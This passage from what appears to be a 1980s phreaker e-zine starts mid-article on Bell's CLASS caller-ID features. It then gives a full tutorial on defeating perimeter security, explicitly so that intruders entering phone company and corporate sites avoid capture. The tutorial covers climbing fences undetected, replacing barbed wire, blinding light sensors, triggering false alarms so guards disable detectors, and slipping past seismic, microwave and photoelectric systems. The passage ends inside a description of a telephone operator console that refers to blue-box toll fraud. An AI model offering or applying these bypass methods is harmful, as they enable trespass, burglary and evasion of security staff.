customer does not have the call waiting custom  calling feature , returns information to the originating CO to apply a busy  signal to the customer. This is but one of many features toll CCIS provides  the network with.      Since this text is not centered on the topic of toll CCIS, technical  aspects aren't as important  except for the comparison between the local  and toll networks for observational purposes   yet it is important to  notice how automated and flexible this type of signalling method is, as well  as its speed and efficiency. All the software control involved with local  and toll networks is called, fittingly, the  stored program control network.   or ISDN  Integrated Services Digital Network . LCCIS will be addressed in a  future article.   CLASS LCCIS Features                         LCCIS would look like this                                           X                                    CO 2                                    ESS                            I T G     1A     I T G    X                                    X                                                                                                           LCCIS                                                                                                                                                X  LCCIS   CCIS SPC   LCCIS     X                    CO 1                            CO 3                    ESS                             ESS                      1A    interoffice trunk group   1A  NPA   Dial 1223           213 NPA  GTE    Dial 114   SPC   Stored Program Control  Network control and Signal Transfer Point   ITG   Interoffice Trunk Group      Using a high speed data link between local offices creates a much more  flexible and more effecient way for intra LATA central offices to communi   cate. Instead of using per trunk signalling  using the same trunk used for  voice transmission to send routing and billing information , such data would  be sent thru a 2400 bps dedicated data link, which interacts with a local  signal processing and transfer point. From that point, signalling information  is distributed to appropriate central offices or tandem switches.      At the during which this article was being initially researched, CLASS was     only being developed for the  1A ESS switch due to the flexibility of it's  memory handling, it's speed and what Bell Labs called 'cost efficiency'. At  the end of the research involved with this article, CLASS was already  implemented in data stage on ESS 5.      LCCIS will work with the local switches using stored program con   trol, keeping track of call data. The 1A switches will use what  is called  scratch pad  memory  also known as call store , in conjuction  with LCCIS's database, to accomplish all the features that LASS provides.  This memory will hold such data as  line history , and a  screening list .  That information will make it possible for autoredial, selective call  forwarding, nuisance call rejection, and distinctive call waiting tones.   Selective CF                    Selective call forwarding is defined by the subscriber  the sub   scriber must have conventional call forwarding to request this service .  Using call store, or more specifically the screening list, one will  be able to selectively forward a call to another directory number by  executing a few simple commands on the friendly home bound telephone   unlike migrating telephones most frequently found in hotel rooms . An  access code  a list will appear at the end of the file  will be entered,  and a special tone will be issued from the subscriber's CO. The cus   tomer will then dial in the numbers he wants forwarded to the particular  number. After each number, a tone will sound indicating the acceptance  of the number. Individual BOC's  Bell Operating Companies  will be  able to define the amount of numbers which may be screened. Once this is  done, the cusomter hangs up and the ESS takes over. Now, whenever some  one calls this particular customer, the customer's switch will compare  the calling line's directory number with those stored in scratch pad  memory. If the CLID matches one of the numbers in 1A memory associated with  the called directory number, the number is forwarded. If not, the phone will  ring at the original destination. This in particular could make it very  difficult on system hackers, as you could probably imagine. A company can  subscribe to this CLASS feature, and enter only the numbers of authorized  users to be forwarded to a computer. Bureaus inside the various telephone  companies and other sensitive operations can screen calls to particular  numbers by using this service.      This is a security that's hard to beat, but of course there is a way   simple law of nature  nothing is fail safe . There will always be the  obvious way of finding numbers which are being forwarded to, like auto   dialing entire exchanges  one after the other . Unfortunetly, CLASS will  be providing other services which might make  scanning  seem less  attractive.   Distinctive Ringing                           Distinctive ringing is handled in the same fashion as selective call  forwarding is  the screen list in scratch pad memory. The customer may  enter numbers which the ESS should give special precedence to, and when   ever a call is placed to this particular customer's number, ESS checks  to see whether the CLID matches a directory number listed in the  switch's memory. If a match is made, the subscriber's CO gives the off hook  line a special call waiting tone, or the on hook phone a distinctive ring   possibly using abnormally timed ringing voltage... some readers may picture  a British Telecom ring as an example, although many foreign audible rings  tend to be different .   Call Rejection                      Nuisance call rejection, a feature making it possible to block certain  idiots from ringing your fone  a feature we can all benefit from at  one time or another... or all the time , uses the information retrieved  from LCCIS  CLID .  Let's say customer A calls customer B                                      LCCIS                          A      CO               CO      B                                    trunk          Customer B happens to despise customer A, and keys in a special      code. ESS again takes over and looks at the CLID information, and stores  the calling line directory number in a special screen list associated with  with customer B. The next time customer A tries calling customer B, the  terminating office will reroute the call to a local  the originating CO   digitized recording telling customer A that the call he made cannot be  completed due to customer B's request   I'm sorry, but the customer you  have tried to reach wishes you were eaten by a rabid canibal on drugs  .   Dial Back                 To create such a feature as  dial back   for called or calling party ,  the ESS scratch pad memory is used again. The same principles are  used as are employed in the already established custom calling feature,  auto redial. CLID will be used in this way                                         received from CLID                     last called mem     last caller mem                                                                                                                                                                     Your ESS switch will keep track of who you called last, and who called  you last, thru the retrieval of calling line information provided by  LCCIS in conjunction with your switch  Your switch will know what number  you called last by directly storing the digits you dialed previously. Local  signalling will provide calling line information via LCCIS call  information forwarding using the data link mentioned . This way, with your  access code      , you will have total re dial service.   Customer Trace                      This type of memory handling and signalling method will also allow the  feature that everyone was afraid would abolish  phreaking . Subscriber  initiated tracing, using the last caller directory number stored at your CO,  will be available as far as Bell Laboratories is concerned. There seems to be  two types of  customer originated trace . One will forward the number to local  authorities, at  which it will be handled through the police. The other  feature AT T Bell Labs is working on will be a display module that will sit by  your fone, and will display calling directory numbers. All other CLASS  features that use the calling line information are used at the descretion of  the caller. The customer originated trace, however, using the individual or  bulk calling line identification features   trace   allow the customer to view  the calling number. The world is not ending... yet, in any case. Individual  customers will be able to employ a special  privacy code , which when dialed,  tells the far end switch not to forward the calling number to a desk display.  Whether there will be a way to override this or not is obvious  of course.  The police, the military and government agencies are all likely to have a  higher priority level than your privacy. It seems that long distance  carriers could benefit greatly from CLASS. Why Bell AT T should give any type  of special services to OCCs not given to other non telephone companies,  especially after equal access is fully implemented, I don't know  but then  again, it is EQUAL access . It's always possible. It is also possible that  there will be no desk display. There are those phone phreaks who feel that  BOC's will never give the end party the priviledge of retrieving the calling  party's number directly, if not due to plain old Bell policy on the issue of  privacy. We'll have to wait and see about that point  the desk display is, in  fact, operational and is being used in test stage. Whether Bell Labs feels  that this feature can and will be used in a full scale non beta stage BOC  situation is a different story. The economic feasability is questionable.   End Notes                 CLASS, using local CCIS, will not function on inter LATA calls. The  local CCIS network is exactly that  local, and does not extend into the  realm of  toll network . This will eventually be corrected  allowing toll  CCIS to interact with LCCIS as far as CLID information is concerned . How  the various long distance networks will exchange information with the local  BOC network has not been determined  by the writer of this article . It  would seem like a monumental task to try to integrate the emerging long  distance companies into the AT T BOC ISDN, be it because of equipment  inconsistancies or lack of cooperation on the part of the OCC, etc. This  will be discussed in an upcoming article dealing with toll CCIS.  Although CLASS has been built around the ESS  1A switch, it has, as has been  mentioned, been co developed for use with the ESS  5 switching machine.      CLASS is going to cause problems, as well as create a new environment  for telephone users. Of course, those problems are only problems to people  who will generally be reading this article, but the more you know about CLASS  the more comfortable you'll feel about the service. It can be used to  one's advantage, even as a telecommunications hobbyist. Just as a  corporation will be able to set up a complete history of who is calling their  system, and eventually keep people off the system using the screen list in  memory, the same features can be applied to bulletin board systems and the  like. Imagine being able to keep all the local bozos off your board, or  being able to screen all but your private local users  making your system  completely inaccessible through the PSTN network from any telephone but  that of one of your users . It would seem to be a useful feature, if nothing  else but an easy feature, to implement.      It is a little difficult, if not plain awkward, to write an article about  a topic which is subject to change at the researcher's ignorance. I think  that CLASS is enough of a momentous issue that at least some text by a  hobbyist should be released for public knowledge purposes.  Yet my awareness  of the fact that some of this text may be outdated, or inaccurate, by the  time CLASS is released as a BOC service, is in itself the explanation of why  there is a version number at the head of this article. Most likely, when CLASS  becomes public, the second version will be released with update notes   if need be...most probably so .

Doctor  413  Who  Mr. DNA   The LOD H Technical Journal  File  3 of 12                Lex Luthor and The Legion Of Doom Hackers Present                Identifying, Attacking, Defeating,  and Bypassing              Physical Security and Intrusion Detection Systems                             PART I  THE PERIMETER   The reasons for writing this article are twofold   1  To prevent  the detection  and or capture  of various  phreaks, hackers  and    others,  who attempt to gain access to  phone company central offices, phone    closets, corporate offices, trash dumpsters, and the like.  2  To create an awareness and  prove to various security managers, guards,  and    consultants  how easy it  is to defeat  their security systems  due to their    lack of planning, ignorance, and just plain stupidity.   In  the past, I have written  articles on  Attacking, Defeating, and Bypassing  Computer Security.  Now I  take those  techniques and  apply them  to  Physical Security.  The information  contained herein,  has been  obtained from research on the different devices  used in physical security,  and in practical   tests  which I and others have performed on these devices.   INTRODUCTION                 Physical  Security  relies  on  the  following  ideas  to  protect  a facility  Deterrence, Prevention, Detection, and Response. Deterrents are used to 'scare' the  intruder  out of  trying  to gain  access.  Prevention tries  to  stop the intruder from gaining access. Detection 'sees' the intruder while attempting to gain  access. Response tries to stop and or prevent as much damage or access to a facility as  possible after detection.  There are 3  security levels used  in this  article and in  industry to designate  a facility's need.  They are  Low, Medium, and High. The amount, and types of security devices used by a  facility are  directly proportional  to the level  of security the  facility 'thinks' it needs. When  I  use  'facility' I  am  refering  to the  people  in  charge  of security,  and the actual building and assets  they are trying to protect. This article will be  primarily concerned with  the protection of  the perimeter.  I have  2  other articles  planned in  this  series. The  second is  the security concerning the exterior of a facility  cipher locks, window breakage detectors, magnetic  contact switches, etc. The third part will deal with security systems inside a facility  Passive Infra Red detectors, ultrasonic detectors,  interior microwave systems, and the various card access control systems.  THE PERIMETER                  A facility's first  line of defense  against intrusion is  its' perimeter.  The perimeter may have any or all of the following     A single fence    An interior fence coupled with an exterior fence    Regular barbed wire    Rolled barbed wire    Various fence mounted noise or vibration sensors    Security lighting and CCTV    Buried seismic sensors and different photoelectric and microwave systems   Fences           Fences are commonly used to protect the perimeter. The most common fence in use today is the cyclone fence,  better known as the  chain link fence. Fences  are used  as a deterrent and to prevent  passage through the perimeter. Common ways of defeating  fences are  by cutting,  climbing, and  lifting. Cutting  is  not usually  recommended for surreptitious entry, since it is easily noticeable. In this article,  we will  be  taking the  'Stealth'  approach. Climbing  is  most commonly done, but if the fence is in plain view, it may not be advisable since you can be seen easily. The higher the fence, the longer it takes to climb. The longer it takes to climb, the longer security has to detect and respond to your actions. Lifting is  better since  you are  closer to  the ground,  and not  as easily  spotted, but the fence must be very  flexible, or the sand very soft so you can get under  the fence quickly  and easily. Whenever  you see a  somewhat 'unclimbable' fence  or one that you just don't want to climb  you should check the perimeter for  large trees with  uncut branches hanging  over the fence  or other  objects which will enable you to  bypass the fence without ever touching it. You  could use  a  ladder but  you don't  want  to leave  anything  behind, especially  with your fingerprints on  it, not that you  plan on doing anything illegal of course.  Electric fences are not used for security purposes as much as they were in  the past.  Today, its  main use  if to keep  cattle or other animals  away from the perimeter  either from  the inside or  outside . There are  devices which  send a low voltage current through a fence and can detect a drop in the voltage when someone grabs onto the fence. Again, not too common so I will not go into it.  For high security installations, there may be 2 fences. An outer fence, and  an inner  fence which are 5 10 yards apart. It  isn't often that you see this type of setup, it is mainly  used by government agencies  and the military. You  can be  very sure that there are various intrusion detection devices mounted on the fence, buried  underground  between  them, and or  line of sight  microwave  or photoelectric  devices used.  These will be  mentioned later. If  you insist on penetrating the perimeter, then you should try to measure how far it is between fences. Now find a 2 foot by X foot board where X is the distance between the 2 fences. Very slowly  place the board  on top of  both fences. If  there are  no fence vibration sensors you can just climb the fence and step onto the board to walk across the top. If there are  fence sensors, you will need a ladder  which cannot touch the fence to get you on top of the board. You can then walk on the board, over the ground in between, and jump down, being careful not to  disturb the  fences. This will work if there are no sensors after the 2 fences. Identi  fying sensors will  be mentioned later.  Obviously the method  of using a  long board  to put on top of  the two fences will not  work if the fences are spaced too far apart. Also, you and the board can be seen very easily.  Barbed Wire                There  are two common  types of barbed wire  in use today.  The more common and less secure is the type that is strung horizontally across the fence with three or more rows. The 'barbs' are spaced about 6  apart, enough for you to put your hand in between while  climbing over. Also,  it is thin enough  to be cut  very easily.  If you think you will need to leave in a hurry or plan on problem free surreptitious entry and the only way out will be to climb over the fence  again you  can cut the  wire from one post  to another, assuming the  wire is tied or soldered to each post, and replace it with a plastic wire which looks like  the wire  you just cut. Tie it to each  post, and come back anytime after that. You can then climb over it without being cut. The other type of wire, which is more secure  or harmful, depending on how you look at it, is a rolled, circular wire commonly called Razor Ribbon.  One manufacturer of this  is the American  Fence Co.  which calls  it 'the mean  stuff'. And  it is. The  barbs are  as sharp as razors. Of course this can be cut, but you will need very long bolt cutters and once  you cut it, jump as far back as  you can to avoid the wire from springing into your face. As mentioned earlier,  cutting is irreparable, and obvious.  If the  wire is  loosely looped, there  may be  sufficient room in  between to get through without getting stitches and losing lots of blood. If the wire is  more tightly  looped you may be able to cover  the the wire with some tough material such as a leather sheet so you can climb over without getting hurt. This method is not easy to accomplish however. You may want to see if you can get under the fence or jump over rather than climb it.   Fence mounted noise or vibration sensors                                             Let's assume you have found a way to get past the fence. Of course you have not tried  this yet,  since you  should always  plan before  you act.  OK, you have planned how you would  theoretically get over  or past the  fence. You are  now past  the deterrent and prevention stages. Before  you put the plan into action you had better check for the things mentioned earlier. If a fence is the  first step  in  security defense,  then fence  mounted sensors  are the  second step. The types of detection equipment that can be mounted on the fence are   Fence shock sensors  These mount on fence posts at intervals of 10 to 20  feet, or  on every post. They are small boxes clamped about 2 3 up from ground level. There is a cable, either twisted  pair or coax running horizontally across  the fence  connecting these boxes. The cable can be concealed in conduits or inside the fence itself, thus,  making it hard to  visually detect. Each fence  sensor consists  of a seismic shock  sensor that detects climbing  over, lifting up or cutting through the fence. So if the  fence is climbable, it would not be  wise to  do  so since  you may  be detected.  Of  course it  doesn't matter  if your detected if there is no security force to respond and deter you.  Another type, is  called the  E Flex cable. It's  simply a  coax cable  running horizontally  across the fence. This  cable can not only  be used on chain link fences, but can also be used on concrete block, brick, or other solid barriers. It  may be on the outside, or  mounted inside the fence, thus, making detection of the device  harder. Of course  detection of this  and other similar  devices which  cannot be seen, doesn't make it impossible.  A way to detect this, is by simply repeatedly hitting the wall with a blunt object or by throwing rocks  at it.  If nothing out of the ordinary happens, then you can be reasonably sure it is not in place. This is basically a vibration sensor.  Low frequency microphones  This  is essentially a coax  cable that responds  to noise transmitted within the fence itself.  Vibration  sensors  These are  based on mercury  switches, a ring  or ball on a pin, or a  ball on  a rail.  Movement of the  fence disturbs  the switches  and signals  alarms. A hint that  this is in use  is that it can  only be used on a securely constructed and tightly mounted fence, with no play or movement in it. Otherwise, they will be getting false alarms like crazy.  OK,  you know all about these  types, how the hell do  you get around it  Well, don't touch the fence. But if there  is no alternative, and you must climb  it, then  climb the fence  where it makes a  90 degree turn  the  corner  or at the gate. Climb it very slowly  and carefully, and you should  be able to get  over without  being detected by  these sensors! Make  sure you climb  on the largest pipe and don't fall.  Security lighting and CCTV                               Sometimes,  fences may be backed up by Closed Circuit TV  CCTV  systems to make visual monitoring  of  the  perimeter  easier and  quicker.  By  installing  an adequate  lighting system  and conventional CCTV  cameras, or  by using special low light sensitive  cameras, the  perimeter can  be monitored  from a  central point.  Security personnel can then be  dispatched when an intruder is detected on the monitors.  Some systems are stationary, and others can be moved to view different areas of the  perimeter  from within  the  central station.  It  would be  in  your best interest to determine if  the camera is  stationary or not. If  so, you may  be able to plan a path which will be out of the view range of the camera. If it is movable, you will have to take your chances.  Light control sensor  This  utilizes a Passive InfraRed  PIR  sensor to  detect the  body  heat  emitted from  someone  entering  the detection  area,  and can activate a light or  other alarm. PIR's  will be discussed in  Part II of  this series.  The sensor has  an option called   'night only mode'  in which a light will flash when a person enters the  area, but only during night hours. It  can tell  if its dark by either a photoelectric sensor, or by a clock. Of course if its daylight savings time, the clock may not be totally accurate, which can  be used  to  your  advantage. If  it  is  photoelectric, you  can  simply  place a flashlight pointing directly  into the  sensor during daylight  hours. When  it gets  dark, the photoelectric sensor will still  'think' its day since there is sufficient light, thus,  not activating  the unit to  detect alarm  conditions. This should enable you to move within the area at will.  Buried Seismic Sensors                           Seismic detectors are designed to identify an intruder by picking up the  sound of  your footsteps  or other  noises related  to passing  through the protected area. These sensors have a  range of about 20  feet and are buried  underground and  linked by a cable, which carries  their signals to a processor. There, the signals are amplified and equalized to eliminate frequencies that are unrelated to  intruder motion. The signals are converted to pulses that are compared with a standard signal threshold. Each pulse  that crosses this threshold is  tested on  count and frequency. If it meets all  the criteria for a footstep, an alarm is triggered. These sensors can even be installed under asphalt or concrete  by cutting a trench through the hard surface. It is also immune to weather and can follow any type of terrain. The only restriction is that the area of  detection must be free of any type of obstruction such as a tree or a bush.  Electronic field sensor                            These detect an intruder by measuring a change in an electric field. The  field sensors use a set of two cables, one with holes cut into the cable shielding to allow the electromagnetic field to 'leak' into the surrounding area. The  other cable  is a receiver to detect the field and any changes in it. Objects passing through the field distort  it, triggering an alarm.  This sensor can either  be buried  or free  standing, and  can follow  any type  of terrain.  But its very sensitive to animals, birds, or  wind blown debris, thus,  if it is very  windy out,  and you know this is  being used, you can get  some paper and throw it so the wind takes it and sets off the alarm repeatedly. If it is done enough, they may temporarily turn it off, or ignore it due to excessive false alarms.  It  is not hard to tell  if these devices are in  use. You cannot see them, but you don't have  to. Simply get  3 4 medium  sized stones. Throw  them into  the place  where you think the  protected area is. Repeat  this several times. This works on the lesser advanced systems that have trouble distinguishing this type of  seismic activity from human walking running. If nothing happens, you can be reasonably sure this  is not in  use. Now that  you can detect  it, how do  you defeat  it  Well as far as the electronic field sensor is concerned, you should wait for a windy night and cause excessive false alarms and hope they will turn it off. As far as the seismic sensors, you can take it one step at a time, very softly, maybe one  step every 30 60  seconds. These sensors  have a  threshold, say,  two  or more  consecutive footsteps  in  a 30  second time  interval will trigger the alarm. Simply take  in one step at a  time, slowly, and wait,  then take another step, wait, until you reach your destination. These detectors work on the assumption that the  intruder has no knowledge  of the device, and  will walk run across the protected area normally, thus, causing considerable seismic vibrations. The problem with this method is that it will take you some time  to pass  through the protected area. This means there is more of a chance that you will be seen. If there are  a lot of people going  in and out of the  facility, you  may not want  to use this method.  Another way would be  to run across the protected area, right next  to the door,  assuming  that is where the  response team  will come out  and drop  a large cat or a  dog there. When they come out, they will hopefully blame the alarm on the animal. The sensor shouldn't  really pick  up a smaller animal, but odds  are the security force are contract guards who wouldn't know the capabilities  of the device and  the blame would fall  on the animal and not you, assuming there were no cameras watching...   Microwave systems                      In  an outdoor  microwave system,  a beam  of microwave  energy is  sent from a transmitter to  a  receiver  in  a conical  pattern.  Unlike  indoor  microwave detectors,  which detect  an intruders'  movement in  the microwave  field, the outdoor system reacts to  an intruders' presence by  detecting the decrease  in energy  in the beam. The beams can protect an  area up to 1500 feet long and 40 feet wide. All transmission is  line of sight and the area between  transmitter and receiver should be kept clear of trees and other objects that can block the beam. Microwave systems can operate in  bad weather, and won't signal an  alarm due to birds or flying debris.  These  systems work  on the  Doppler effect, in  which they  detect motion that changes the energy, and sets off an alarm. These devices will usually be placed inside  a fence to avoid false alarms.  These devices are very easy to visually detect. They are  posts from 1 2  yards high, about  6 inches by  6 inches  and there are 2 of them, one receiver and one transmitter. In some cases there will be more, which enables them to protect a larger area.  To defeat this, you can enter the field, very slowly, taking one step at a time but each step should be like you are in slow motion. It doesn't matter how hard you hit the  ground, since it  doesn't detect seismic  activity, only how  fast you approach the field. If you take it very slowly you may be able to get past. Detectors of this type get more and  more sensitive as you approach the  posts. Ergo, choose a path which will lead you furthest away from the posts.   Photoelectric systems                          These  systems rely on an invisible barrier  created by beams of infrared light sent from a light source to a receiver. When the beam is interrupted, the alarm sounds.  The beam can have an effective range of up to 500 feet. Multiple beams can be used to increase the effectiveness  of the system, making it harder  for you  to climb over or crawl under the beams. Photoelectric systems can be prone to false alarms as a result of  birds or wind blown debris passing through  the beam.  The  problem can  be corrected  by  the installation  of a  circuit that requires the beam to be broken for  a specified amount of time before an  alarm is  sounded. Weather conditions like heavy fog, can also interrupt the beam and cause an alarm. This can also be corrected by a circuit that reacts to  gradual signal  loss. These systems should not face directly into the rising or setting sun since this also cuts off the signal beam.  As you can see this system has many problems which you can take advantage of to bypass this system. As with any system and method, surveillance of the facility should be  accomplished  in  various  weather conditions  to  help  verify  the existence  of a particular detection device, and to see how they react to false alarms. Many times, you  will be able to  take advantage of various  conditions to  accomplish your mission. If  there is only one  set of devices  transmitter and receiver , try to estimate the distance of the sensors from the ground. You can  then either  crawl under  or jump over  the beam.  This also  works on the assumption that the intruder will not recognize that the device is in use.   MISCELLANEOUS                  Guards  There  are two  types, in house  or company  paid guards  and  contract guards. Contract guards are less secure since they do not work for the facility and if they make a mistake they  simply get transferred to another facility  no big deal. In house guards know the facility better and have more to lose, thus, they are probably  more security conscious.  Be aware of  any paths around  the perimeter  in which guards can will walk ride  to visually inspect the exterior of the facility.  Central monitoring   Monitoring of  the devices  mentioned in  this article  is usually  accomplished  at a  'Central  Station' within  the  facility. Usually, guards  SHOULD  be monitoring these. If  you have planned well enough, you  may find  that the guard leaves his her post to  do various things at the same time every night. This would  be an ideal time  to do anything that  may be seen  by cameras.  Unfortunately, there will probably be more than one guard making this nearly impossible.  Gates  Probably the easiest way to pass through the perimeter is to go  through the  gate. Whether in a car,  or by walking. This may not  be too easy if it is guarded, or if there is a card reading device used for entry.  Exterior card readers  An in depth look at  the types of cards used will be  in part 3 of this series. But for now, if the card used is magnetic   not Weigand  it is quite  possible to attack this. If you have an  ATM card,  Visa, or other magnetic card, slide the card thru, jiggle   wiggle it, etc. and quite possibly the gate will open. Reasons for this  are that since it is outside, the  reader is  subjected  to  extreme  weather  conditions  day in  and day out, thus, the detecting heads may not be in the best of shape, or since  it is outside it may be a cheap  reader. In  either  case, it may not work as good as it should  and can make 'mistakes' to allow you access.  Combinations  The devices listed in this article do not have to be used  alone. They can and are used in conjunction with each other for greater security.  Diversions  In some cases, a diversion could better insure your passage through the perimeter. Keep this in mind.  Extreme weather conditions  All  devices have an  effective operating range  of temperatures.  On the low end of the scale, most devices will not operate if it is  30  degrees Fahrenheit  or lower.  Though,  quite a  few will  not  operate effectively  under the following  temperatures   13 f,   4 f,  10  f,  32 f. On the other side of the scale, they will not operate in excess of   120 f,  130 f and   150 f.  It is  unlikely that  the outside  temperature will  be above 120 degrees, but  in  many  places,  it  may be  below  freezing.  Take  this  into consideration  if a facility has these devices,  and you cannot bypass them any other way.  I could not have possibly mentioned everything used in perimeter protection  in this  article. I have tried to inform you of the more common devices used. Some things were intentionally left out, some  were not. I welcome any  corrections, suggestions,  and methods, for this article  and the future articles planned. I can be contacted on a few boards or through the LOD H TJ Staff Account.   CONCLUSION               This article primarily dealt with the identification of various 'tools' used in physical security for the deterrence, prevention, detection, and response to an intruder. There also were some methods which have been used to attack,  defeat, and  bypass these 'tools'. None  of the methods mentioned  in this article work 100  of the time  in all circumstances,  but ALL have  worked, some were  under controlled  circumstances, some were not. But all have worked. Some methods are somewhat crude, but they get the job done. Some methods were intentionally left out  for obvious reasons.  Even though this  article was written  in a tutorial fashion, in no way am I advising you to  go out and break the law. I am  merely showing  you how to identify devices that you  may not have known were in place to keep you from making a stupid mistake and getting caught.

Figure 1. 100 B TSPS Console layout          Due to 80 col width, picture is a little distorted vertically  Legend           o Abbreviations in all capital letters are ILLUMINATED KEYS          o Abbreviations in all lower case letters are NON ILLUMINATED KEYS          o Abbreviations in upper   lower case letters are LAMPS ONLY   ie  VFY   Lighted VERIFY key, tim   Unlighted TIME key, Cg   CALLING Lamp      Above is the standard AT T 100 B console layout, while there may be additional or different keys on the various  consoles, they will generally resemble the above layout closely.  In the lower right hand corner you will notice the numbers 0 9 laid out into what resembles a keypad, this is exactly what it appears to be. The TSPS Operator uses this keypad for keying in not only routing information  Phone numbers, Inward routings, etc..  but as a multi purpose tool for entering various numeric codes recognized by the TSPS software itself. Routing information applied onto the trunks from the TSPS position is of course in MF  Multi Frequency . When a TSO keys in a number or routing, the console buffers the KP INFORMATION DIGITS until the ST key is pressed, at which time it plays the buffered KP INFO DIGITS ST onto the trunk in a uniformly spaced sequence. So if you were somehow able to listen in on a TSO actually routing a call, it would not sound like someone placing a call on a standard Touch Tone telephone  or homemade blue box , but more like someone pressing a  Redial key  on a Touch Tone  TT  phone. The duration of the tone and space between the tones are a network wide standard, although the network in most cases is quite tolerant to deviations of this standard.  This  loose  tolerance is what allows us to simulate In band signalling with our blue boxes .       At the upper left hand side of the diagram you will see the Ticket box, This box has 4 slots marked New, Cancel, Scratch and Completed. I believe this is used for manually filled out trouble and or time tickets. As far as I know manually filled time tickets are a thing of the past, however in case of equipment failure the tickets are available I assume.  TSO would manually fill out a trouble ticket to report trouble reaching a number out of her LAN  Local Area Network   or, The area directly served by her particular TSPS position , whereas to report trouble with a number in her LAN she would simply key in a trouble code  utilizing the KP TRBL  Trouble  key . to automatically place a trouble report.       To the right of the Ticket box you will see the DISPLAY. The display works in conjunction with certain keys on the console, and is used to display timing information  hours, mins, sec's , Cost per minute, Calling number identification  what most people refer to as TSPS ANI , numbers called, and various special codes. The console display can be in one of two states, either 1  displaying digits, or 2  displaying nothing  dark . Both of which have different meanings when resulting from certain procedures attempted by a TSO. LIGHTED KEYS, and LAMPS on the console can be in one of three states either 1  NOT ILLUMINATED  dark , 2  ILLUMINATED, or 3  FLASHING. Again the state of a lamp lamp key meaning different things under different conditions.   II.                        KEY DESCRIPTIONS   USES                                                          Below the Ticket box you will see a row of 5 keys starting with the key labeled  VFY   Verify , these are various special purpose keys used by TSPS that have no real  grouping  unlike the other  Key groups . These are    VFY    Verify, Illuminated key. Used in conjunction with the keypad, allows the TSO to verify  listen in  on a telephone call that is in progress, although any conversation taking place on that call is scrambled to the TSO, and despite popular belief THE SCRAMBLING PROCESS IS DONE AT THE CONSOLE LEVEL, AND NOT ON THE TRUNK LEVEL, SO FOR THOSE OF YOU WHO SEEN REFERENCE TO THE  BLV SCRAMBLING SHUT OFF TONE  PLEASE IGNORE IT, IF YOU WERE TO SOMEHOW GAIN ACCESS TO A VERIFICATION TRUNK FROM A NON TSPS POSITION, THE CONVERSATION WOULD NOT BE SCRAMBLED.    OVR SES    Over Seas, Illuminated key. Used in overseas call completion through an Overseas Toll Completion Center Server  IOCC . I believe it also allows the TSO to key in more than 10 digits  standard POTS  for IDDD call completion.   SCN    Screen, Illuminated key   Lights to notify TSO that incoming call has an associated screening code,  ie  74 collect calls only, 93 special billing . Depressing this key causes the code to show on display, and it's up to the TSO to decipher the code and explain its meaning to the customer if he she is attempting something forbidden by his associated screening code.  ie  Prison phones have a screening code of 74, allowing them to place collect calls only.    INW    Inward, Illuminated key   Lights to notify the TSO that the incoming call is  Operator to Operator , therefore she answers by pressing the key and answering  Inward! . In most cases Inward Operators are actually TSPS, with their INWARD lamps lit.   EMR INT    Emergency Interrupt, Illuminated key. Used in conjunction with the VFY key, to interrupt a call in progress while a line Verification is being done, pressing this key causes an audible  beep  to be applied to the line, and de activates the console scrambling  for roughly 30 seconds  , allowing the TSO to talk to the parties being verified interrupted. Use of this key   the VFY key, is constantly kept track of via various security   maintenance TTY's and any abuse misuse will set off alarms.       To the right of the above set of keys you will see three groups of LAMPS Keys labled  Non coin ,  Coin 1 , and  Hotel .  The TSO utilizes the condition of these lamps to identify the status of incoming calls. There are three lamps that are common to each of the three groups, these are   Sta ,  0  , and  0   their meaning is identical in each case as you will see below.   Sta    Lamp, NON COIN STA lamp lights when a non coin caller requires TSPS assistance in placing an otherwise direct dialable call  in some rural areas that have limited DDD features .  COIN STA lamp lights on direct dialed coin calls that are sent to TSPS for payment collection. HOTEL STA lights on Hotel originated DDD calls, TSPS also receives room number call is being originated from.   0     Lamp, Lights to signify that the incoming call was originated by a customer dialing a  0 telephone number  for an operator assisted call in each of the three groups  coin, non coin, hotel motel .   ie. if a customer were to place a  person to person  op assisted  call from a payphone, this would cause the  0   lamp in the  coin  group to light, one placed from a residential phone would cause the  0   lamp in the  non coin  group to light, etc..    0     aka  Dial Zero , Lamp. Lights to signify that the incoming call was originated by a customer simply dialing 0  zero , in each of the three categories  non coin, coin, hotel motel .   PST PAY    Post Pay, Illuminated key. Coin group only, Depressed by TSPS when a customer requests a  post pay  call from a payphone, allowing him to deposit the full charge at the completion of the call.   Tne    Tone, Lamp. I believe this lamp lights to inform the TSO that a coin customer has flashed his her switchook during a call in progress, requesting operator assistance, although I'm not positive of this.   GST    Guest, Illuminated key lights on all hotel originated calls.       Below the above rows of keys and to the far left you will see a row of keys labled  Outgoing Trunks . TSPS utilizes this group of keys to select various outgoing trunk groups the keys are used as follows    DA    Directory Assistance, Illuminated key. Used by TSO to place calls to the directory assistance group.   R R    Rate   Route, Illuminated key. Used to place calls to rate and route, I believe TSPS now goes to the Universal Rate and Route position known to all you boxers to be found at KP 800 141 1212 ST.   SWB    Switchboard, Illuminated key. I believe this key is used to reach a cord board position, although I have no evidence of this.   OGT    Outgoing Trunk, Illuminated key. Depressed by TSO to select an outgoing trunk to be used to place operator assisted calls, special purpose calls  ie. Inward , etc..       To the right of this row of keys you will find the group labled  Ring , these keys are utilized by TSPS to activate special purpose ring features and line handling.   BAK    Ring Back, Illuminated key. Used by TSO to ring the originating party's line while holding the forward line in the event that the originating party looses his connection   FWD    Ring Forward, Illuminated Key. Exactly the opposite of ring back.   CAL BAK    Call Back, Illuminated key. Used in special operator call back situations on person to person calls where the called party is not available but a message is left anyway, I really don't understand it's full potential and most positions I have spoken with don't either.   T C    Time and Charges, Illuminated key.   Nfy    Lamp.  Used in Non ACTS  Automatic Coin Toll Service  originated calls, lights to inform TSPS to notify caller of expiration if initial n minute period  n   number of minutes entered via the KP NFY key at the origination of the call .   Chg Due    Lamp. Lights to inform TSO that more money is needed at the completion of a TSO assisted coin call, the usual procedure is to ring the coin station back and attempt to frighten the customer into making the proper deposit   If you don't pay we'll bill the called party...  .   Key Clg    Key Calling, Lamp. This lamp is used by TSPS to determine the status of an incoming  Operator Number Identification   ONI  marked caller or an incoming caller that was routed to TSPS due to an  ANI Failure   ANIF  Both call conditions come to as a  0   call  hotel, non coin, coin   see above , if the calling party is marked as  ONI Required  the appropriate  0   lamp will light, and the  Key Calling  lamp will be LIT STEADY. If the incoming call was due to an ANIF, the  0   lamp will be lit, and the  Key Calling  lamp will be LIT   FLASHING.       Directly to the right of the  Ring  group of key's you will find the RELEASE set of key's, these two Illuminated key's allow the TSO to selectively release  disconnect from  either the calling, or called parties by pressing either the  Release Back   BAK , or  Release Forward   FWD  key respectively.       To the right of the release set, you will see a group of four key's with no particular  group designation , these 